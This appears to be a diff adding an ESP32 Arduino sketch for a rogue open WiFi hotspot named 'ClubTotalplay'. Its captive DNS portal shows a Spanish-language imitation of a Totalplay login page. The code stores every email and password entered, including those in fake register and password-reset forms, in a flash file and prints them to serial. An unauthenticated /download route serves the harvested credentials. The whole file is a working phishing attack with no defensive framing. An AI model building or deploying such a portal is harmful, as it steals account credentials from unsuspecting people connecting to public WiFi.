@@ -1,0 +1,651 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <SPIFFS.h>
+
+const char* apSSID = "ClubTotalplay";
+const char* apPassword = "";
+
+IPAddress local_ip(8, 8, 8, 8);
+IPAddress gateway(8, 8, 8, 8);
+IPAddress subnet(255, 255, 255, 0);
+
+DNSServer dnsServer;
+WebServer server(80);
+
+const char* credFile = "/credenciales.txt";
+
+const char loginPage[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Totalplay - Inicia sesión</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: white;
+            padding: 30px 20px 10px 20px;
+            text-align: center;
+        }
+        
+        .logo-text {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #888;
+        }
+        
+        .logo-text span {
+            font-size: 0.9rem;
+            vertical-align: super;
+            color: #888;
+        }
+        
+        .header h2 {
+            color: #888;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-top: 15px;
+            margin-bottom: 8px;
+        }
+        
+        .header p {
+            color: #999;
+            font-size: 0.85rem;
+        }
+        
+        .content {
+            padding: 20px 20px 30px 20px;
+        }
+        
+        .field-group {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .input-line {
+            position: relative;
+            width: 100%;
+        }
+        
+        .input-line input {
+            width: 100%;
+            padding: 12px 0 5px 0;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 1rem;
+            outline: none;
+            background: transparent;
+        }
+        
+        .input-line input:focus {
+            border-bottom-color: #003366;
+        }
+        
+        .input-line label {
+            position: absolute;
+            left: 0;
+            bottom: 5px;
+            font-size: 1rem;
+            color: #aaa;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+        
+        .input-line input:focus + label,
+        .input-line input:not(:placeholder-shown) + label {
+            bottom: 28px;
+            font-size: 0.7rem;
+            color: #888;
+        }
+        
+        .input-line input::placeholder {
+            color: transparent;
+        }
+        
+        .input-icons {
+            position: absolute;
+            right: 0;
+            bottom: 5px;
+            display: flex;
+            gap: 8px;
+        }
+        
+        .input-icons span {
+            cursor: pointer;
+            font-size: 1rem;
+            color: #aaa;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-icons span:hover svg {
+            stroke: #003366;
+        }
+        
+        .eye-icon svg {
+            stroke: #aaa;
+            transition: stroke 0.2s;
+        }
+        
+        .eye-icon:hover svg {
+            stroke: #003366;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #003366;
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .btn:hover {
+            background: #002244;
+        }
+        
+        .links {
+            text-align: center;
+        }
+        
+        .links a {
+            color: #003366;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: inline-block;
+            margin: 5px 0;
+        }
+        
+        .register-link {
+            margin-top: 15px;
+        }
+        
+        .register-link p {
+            color: #333;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        
+        .register-link a {
+            font-weight: bold;
+        }
+        
+        .footer {
+            background: white;
+            padding: 15px 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+            font-size: 0.7rem;
+            color: #888;
+        }
+        
+        .error-msg { background: #fee; color: #c00; padding: 12px; border-radius: 4px; font-size: 0.8rem; margin-bottom: 20px; text-align: center; }
+        .success-msg { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 4px; font-size: 0.8rem; margin-bottom: 20px; text-align: center; }
+        
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .tooltip .tooltip-text {
+            visibility: hidden;
+            width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            font-size: 0.7rem;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            right: 0;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .tooltip:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .welcome-container {
+            text-align: center;
+            padding: 20px 25px;
+        }
+        .welcome-icon {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+        }
+        .welcome-title {
+            color: #003366;
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .welcome-message {
+            color: #555;
+            font-size: 1rem;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+        .features {
+            background: #f0f7ff;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .features p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+            color: #003366;
+        }
+        .safe-badge {
+            background: #e8f5e9;
+            border-radius: 30px;
+            padding: 12px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .safe-badge p {
+            font-size: 0.9rem;
+            color: #2e7d32;
+            font-weight: bold;
+        }
+        .btn-welcome {
+            display: inline-block;
+            padding: 12px 30px;
+            background: #003366;
+            color: white;
+            text-decoration: none;
+            border-radius: 40px;
+            font-weight: bold;
+            margin-top: 10px;
+            width: 100%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="mainContainer" class="container">
+        <div class="header">
+            <div class="logo-text">Totalplay<span>®</span></div>
+            <h2>Inicia sesión</h2>
+            <p>Ingresa con tu número de cuenta o correo.</p>
+        </div>
+        <div class="content">
+            <div id="messageArea"></div>
+            <form id="loginForm">
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="text" name="correo" id="cuenta" placeholder=" " required>
+                        <label for="cuenta">No. de cuenta o correo</label>
+                        <div class="input-icons">
+                            <span class="tooltip" style="font-size:0.8rem;">
+                                ❓
+                                <span class="tooltip-text">Ingresa tu número de cuenta o correo electrónico registrado</span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="password" name="contrasena" id="password" placeholder=" " required>
+                        <label for="password">Contraseña</label>
+                        <div class="input-icons">
+                            <span class="eye-icon" onclick="togglePassword()">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <line x1="1" y1="1" x2="23" y2="23"/>
+                                </svg>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn" onclick="doLogin()"><strong>Iniciar sesión</strong></button>
+            </form>
+            <div class="links">
+                <a href="#" onclick="showForgot()">¿Olvidaste tu contraseña?</a>
+                <div class="register-link">
+                    <p>¿Eres cliente y aún no tienes cuenta?</p>
+                    <a href="#" onclick="showRegister()"><strong>Regístrate aquí</strong></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <p>© 2026 Totalplay · Internet de Alta Velocidad</p>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var passInput = document.getElementById('password');
+            var iconSpan = document.querySelector('.eye-icon');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+                iconSpan.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                    <circle cx="12" cy="12" r="3"/>
+                </svg>`;
+            } else {
+                passInput.type = 'password';
+                iconSpan.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                    <line x1="1" y1="1" x2="23" y2="23"/>
+                </svg>`;
+            }
+        }
+        
+        function doLogin() {
+            let correo = document.querySelector('input[name="correo"]').value;
+            let contrasena = document.querySelector('input[name="contrasena"]').value;
+            
+            if(!correo || !contrasena) {
+                showMessage("Completa todos los campos", "error");
+                return;
+            }
+            
+            fetch('/guardar', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'correo=' + encodeURIComponent(correo) + '&contrasena=' + encodeURIComponent(contrasena)
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('mainContainer').innerHTML = `
+                    <div class="welcome-container">
+                        <div class="welcome-icon">🏠✨</div>
+                        <div class="welcome-title">¡Bienvenido a Club Totalplay WiFi!</div>
+                        <div class="welcome-message">
+                            Estás a punto de navegar con la<br>
+                            <strong>misma experiencia que tienes en casa</strong>
+                        </div>
+                        <div class="features">
+                            <p>📡 Internet de Alta Velocidad</p>
+                            <p>🔒 Conexión Segura y Estable</p>
+                            <p>⚡ Sin límites ni restricciones</p>
+                        </div>
+                        <div class="safe-badge">
+                            <p>🛡️ Fácil · Seguro · Sin límite</p>
+                        </div>
+                        <a href="/" class="btn-welcome">🌐 Comenzar a navegar</a>
+                    </div>
+                `;
+            });
+        }
+        
+        function showForgot() {
+            document.getElementById('loginForm').innerHTML = `
+                <h3 style="margin-bottom:20px; color:#003366; font-size:1.2rem;">Restablecer contraseña</h3>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="email" id="resetEmail" placeholder=" " required>
+                        <label for="resetEmail">Correo electrónico</label>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="password" id="newPass" placeholder=" " required>
+                        <label for="newPass">Nueva contraseña</label>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="password" id="confirmPass" placeholder=" " required>
+                        <label for="confirmPass">Confirmar contraseña</label>
+                    </div>
+                </div>
+                <button type="button" class="btn" onclick="resetPassword()"><strong>Restablecer contraseña</strong></button>
+                <button type="button" class="btn" style="background:#999; margin-top:5px;" onclick="location.reload()">Cancelar</button>
+            `;
+        }
+        
+        function showRegister() {
+            document.getElementById('loginForm').innerHTML = `
+                <h3 style="margin-bottom:20px; color:#003366; font-size:1.2rem;">Crear cuenta nueva</h3>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="email" id="regEmail" placeholder=" " required>
+                        <label for="regEmail">Correo electrónico</label>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="password" id="regPass" placeholder=" " required>
+                        <label for="regPass">Contraseña</label>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <div class="input-line">
+                        <input type="password" id="regConfirmPass" placeholder=" " required>
+                        <label for="regConfirmPass">Confirmar contraseña</label>
+                    </div>
+                </div>
+                <button type="button" class="btn" onclick="registerUser()"><strong>Registrarme</strong></button>
+                <button type="button" class="btn" style="background:#999; margin-top:5px;" onclick="location.reload()">Cancelar</button>
+            `;
+        }
+        
+        function resetPassword() {
+            let email = document.getElementById('resetEmail').value;
+            let newPass = document.getElementById('newPass').value;
+            let confirmPass = document.getElementById('confirmPass').value;
+            if(!email || !newPass) { showMessage("Completa todos los campos", "error"); return; }
+            if(newPass !== confirmPass) { showMessage("Las contraseñas no coinciden", "error"); return; }
+            fetch('/reset', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'correo=' + encodeURIComponent(email) + '&contrasena=' + encodeURIComponent(newPass)
+            })
+            .then(response => response.text())
+            .then(data => {
+                if(data === "OK") {
+                    showMessage("Contraseña restablecida exitosamente", "success");
+                    setTimeout(() => location.reload(), 2000);
+                } else { showMessage("Error: " + data, "error"); }
+            });
+        }
+        
+        function registerUser() {
+            let email = document.getElementById('regEmail').value;
+            let pass = document.getElementById('regPass').value;
+            let confirmPass = document.getElementById('regConfirmPass').value;
+            if(!email || !pass) { showMessage("Completa todos los campos", "error"); return; }
+            if(pass !== confirmPass) { showMessage("Las contraseñas no coinciden", "error"); return; }
+            fetch('/registrar', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'correo=' + encodeURIComponent(email) + '&contrasena=' + encodeURIComponent(pass)
+            })
+            .then(response => response.text())
+            .then(data => {
+                if(data === "OK") {
+                    showMessage("¡Registro exitoso! Ahora inicia sesión", "success");
+                    setTimeout(() => location.reload(), 2000);
+                } else { showMessage("Error: " + data, "error"); }
+            });
+        }
+        
+        function showMessage(msg, type) {
+            let msgDiv = document.getElementById('messageArea');
+            msgDiv.innerHTML = '<div class="' + (type === 'error' ? 'error-msg' : 'success-msg') + '">' + msg + '</div>';
+            setTimeout(() => { msgDiv.innerHTML = ''; }, 3000);
+        }
+    </script>
+</body>
+</html>
+)rawliteral";
+
+const char successPage[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Totalplay - Conectado</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            max-width: 350px;
+            width: 100%;
+            margin: 20px;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .check { font-size: 60px; margin-bottom: 20px; }
+        h2 { color: #003366; margin-bottom: 15px; }
+        p { color: #666; margin-bottom: 30px; }
+        .btn {
+            display: inline-block;
+            padding: 12px 35px;
+            background: #003366;
+            color: white;
+            text-decoration: none;
+            border-radius: 40px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="check">✅</div>
+        <h2>¡Todo listo!</h2>
+        <p>Ahora puedes navegar<br>sin límite de tiempo.</p>
+        <a href="/" class="btn">Comenzar</a>
+    </div>
+</body>
+</html>
+)rawliteral";
+
+void saveCredentials(String correo, String pass) {
+    File file = SPIFFS.open(credFile, "a");
+    if (!file) file = SPIFFS.open(credFile, "w");
+    if (file) {
+        file.println("Correo: " + correo);
+        file.println("Contraseña: " + pass);
+        file.println("---");
+        file.close();
+    }
+}
+
+bool updatePassword(String correo, String newPass) {
+    if (!SPIFFS.exists(credFile)) return false;
+    File file = SPIFFS.open(credFile, "r");
+    String content = "";
+    while (file.available()) content += file.readString();
+    file.close();
+    int pos = content.indexOf("Correo: " + correo);
+    if (pos == -1) return false;
+    int startPass = content.indexOf("Contraseña: ", pos);
+    int endPass = content.indexOf("\n", startPass);
+    String oldLine = content.substring(startPass, endPass);
+    content.replace(oldLine, "Contraseña: " + newPass);
+    File outFile = SPIFFS.open(credFile, "w");
+    outFile.print(content);
+    outFile.close();
+    return true;
+}
+
+bool userExists(String correo) {
+    if (!SPIFFS.exists(credFile)) return false;
+    File file = SPIFFS.open(credFile, "r");
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        if (line.indexOf("Correo: " + correo) != -1) { file.close(); return true; }
+    }
+    file.close();
+    return false;
+}
+
+void setup() {
+    Serial.begin(115200);
+    delay(1000);
+    if (!SPIFFS.begin(true)) { Serial.println("Error SPIFFS"); return; }
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(local_ip, gateway, subnet);
+    WiFi.softAP(apSSID, apPassword);
+    Serial.print("IP: "); Serial.println(WiFi.softAPIP());
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    
+    server.on("/guardar", HTTP_POST, []() {
+        String correo = server.arg("correo");
+        String pass = server.arg("contrasena");
+        if (correo.length() > 0 && pass.length() > 0) {
+            saveCredentials(correo, pass);
+            Serial.println("Login - Correo: " + correo + " Pass: " + pass);
+            server.send(200, "text/html", successPage);
+        } else server.send(400, "text/plain", "Faltan datos");
+    });
+    
+    server.on("/reset", HTTP_POST, []() {
+        String correo = server.arg("correo");
+        String newPass = server.arg("contrasena");
+        if (userExists(correo)) {
+            if (updatePassword(correo, newPass)) server.send(200, "text/plain", "OK");
+            else server.send(400, "text/plain", "Error");
+        } else server.send(404, "text/plain", "Usuario no encontrado");
+    });
+    
+    server.on("/registrar", HTTP_POST, []() {
+        String correo = server.arg("correo");
+        String pass = server.arg("contrasena");
+        if (userExists(correo)) server.send(400, "text/plain", "El usuario ya existe");
+        else { saveCredentials(correo, pass); server.send(200, "text/plain", "OK"); }
+    });
+    
+    server.on("/download", HTTP_GET, []() {
+        if (SPIFFS.exists(credFile)) {
+            File file = SPIFFS.open(credFile, "r");
+            server.streamFile(file, "text/plain");
+            file.close();
+        } else server.send(404, "text/plain", "No hay credenciales");
+    });
+    
+    server.onNotFound([]() { server.send(200, "text/html", loginPage); });
+    server.begin();
+    Serial.println("Servidor iniciado");
+}
+
+void loop() {
+    dnsServer.processNextRequest();
+    server.handleClient();
+}
